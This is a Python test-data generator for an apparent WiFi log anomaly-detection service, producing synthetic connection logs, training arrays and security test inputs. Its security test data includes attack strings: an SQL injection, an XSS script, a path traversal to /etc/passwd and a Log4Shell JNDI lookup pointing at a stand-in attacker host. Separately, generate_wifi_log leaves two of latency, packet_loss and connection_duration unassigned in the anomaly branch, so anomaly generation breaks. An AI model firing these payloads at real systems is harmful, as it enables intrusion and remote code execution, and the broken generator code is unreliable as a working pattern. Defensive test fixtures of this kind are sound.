import numpy as np
import pandas as pd
from datetime import datetime, timedelta
import random
from typing import List, Dict, Optional, Tuple
import json
import os

class TestDataGenerator:
    def __init__(self, seed: int = 42):
        """Initialize the test data generator with a random seed."""
        np.random.seed(seed)
        random.seed(seed)
        self.device_types = ['laptop', 'smartphone', 'tablet', 'iot_device']
        self.connection_types = ['wifi_2.4ghz', 'wifi_5ghz', 'wifi_6ghz']
        self.protocols = ['802.11n', '802.11ac', '802.11ax']
        self.security_types = ['WPA2', 'WPA3', 'Open']
        
    def generate_wifi_log(self, 
                         timestamp: Optional[datetime] = None,
                         is_anomaly: bool = False) -> Dict:
        """Generate a single WiFi log entry."""
        if timestamp is None:
            timestamp = datetime.now()
            
        # Base signal strength
        signal_strength = np.random.normal(-60, 10)  # dBm
        
        # Add anomaly patterns
        if is_anomaly:
            anomaly_type = random.choice(['signal_drop', 'high_latency', 'packet_loss', 'connection_drop'])
            if anomaly_type == 'signal_drop':
                signal_strength -= 30
            elif anomaly_type == 'high_latency':
                latency = np.random.normal(500, 100)  # ms
            elif anomaly_type == 'packet_loss':
                packet_loss = np.random.uniform(0.1, 0.5)
            elif anomaly_type == 'connection_drop':
                connection_duration = np.random.uniform(1, 5)  # seconds
        else:
            latency = np.random.normal(50, 10)  # ms
            packet_loss = np.random.uniform(0, 0.05)
            connection_duration = np.random.uniform(30, 300)  # seconds
            
        return {
            'timestamp': timestamp.isoformat(),
            'device_id': f"device_{random.randint(1, 1000)}",
            'device_type': random.choice(self.device_types),
            'connection_type': random.choice(self.connection_types),
            'protocol': random.choice(self.protocols),
            'security_type': random.choice(self.security_types),
            'signal_strength': round(signal_strength, 2),
            'latency': round(latency, 2),
            'packet_loss': round(packet_loss, 4),
            'connection_duration': round(connection_duration, 2),
            'bytes_sent': random.randint(1000, 1000000),
            'bytes_received': random.randint(1000, 1000000),
            'is_anomaly': is_anomaly
        }
        
    def generate_wifi_logs(self, 
                          count: int,
                          start_time: Optional[datetime] = None,
                          anomaly_ratio: float = 0.1) -> List[Dict]:
        """Generate multiple WiFi log entries."""
        if start_time is None:
            start_time = datetime.now() - timedelta(hours=count)
            
        logs = []
        anomaly_count = int(count * anomaly_ratio)
        
        # Generate normal logs
        for i in range(count - anomaly_count):
            timestamp = start_time + timedelta(minutes=i)
            logs.append(self.generate_wifi_log(timestamp, is_anomaly=False))
            
        # Generate anomaly logs
        for i in range(anomaly_count):
            timestamp = start_time + timedelta(minutes=count + i)
            logs.append(self.generate_wifi_log(timestamp, is_anomaly=True))
            
        # Shuffle logs
        random.shuffle(logs)
        return logs
        
    def generate_model_training_data(self, 
                                   count: int,
                                   feature_count: int = 10) -> Tuple[np.ndarray, np.ndarray]:
        """Generate synthetic data for model training."""
        X = np.random.normal(0, 1, (count, feature_count))
        y = np.random.binomial(1, 0.1, count)  # 10% anomalies
        return X, y
        
    def generate_performance_test_data(self, 
                                     request_count: int,
                                     batch_size: int = 32) -> List[Dict]:
        """Generate data for performance testing."""
        return [self.generate_wifi_log() for _ in range(request_count)]
        
    def generate_security_test_data(self) -> Dict[str, List[str]]:
        """Generate data for security testing."""
        return {
            'valid_tokens': [
                'valid_token_1',
                'valid_token_2'
            ],
            'invalid_tokens': [
                'invalid_token_1',
                'expired_token_1',
                'malformed_token_1'
            ],
            'valid_api_keys': [
                'valid_key_1',
                'valid_key_2'
            ],
            'invalid_api_keys': [
                'invalid_key_1',
                'expired_key_1',
                'malformed_key_1'
            ],
            'malicious_inputs': [
                '; DROP TABLE users;',
                '<script>alert("xss")</script>',
                '../../../etc/passwd',
                '${jndi:ldap://attacker.com/exploit}'
            ]
        }
        
    def save_test_data(self, 
                      data: List[Dict],
                      filename: str):
        """Save test data to a JSON file."""
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
            
    def load_test_data(self, filename: str) -> List[Dict]:
        """Load test data from a JSON file."""
        with open(filename, 'r') as f:
            return json.load(f)
            
    def generate_test_suite(self, output_dir: str):
        """Generate a complete test suite with various test data."""
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # Generate and save different types of test data
        self.save_test_data(
            self.generate_wifi_logs(1000, anomaly_ratio=0.1),
            os.path.join(output_dir, 'wifi_logs.json')
        )
        
        self.save_test_data(
            self.generate_performance_test_data(10000),
            os.path.join(output_dir, 'performance_test_data.json')
        )
        
        self.save_test_data(
            self.generate_security_test_data(),
            os.path.join(output_dir, 'security_test_data.json')
        )
        
        # Generate and save model training data
        X, y = self.generate_model_training_data(1000)
        np.save(os.path.join(output_dir, 'model_training_X.npy'), X)
        np.save(os.path.join(output_dir, 'model_training_y.npy'), y) 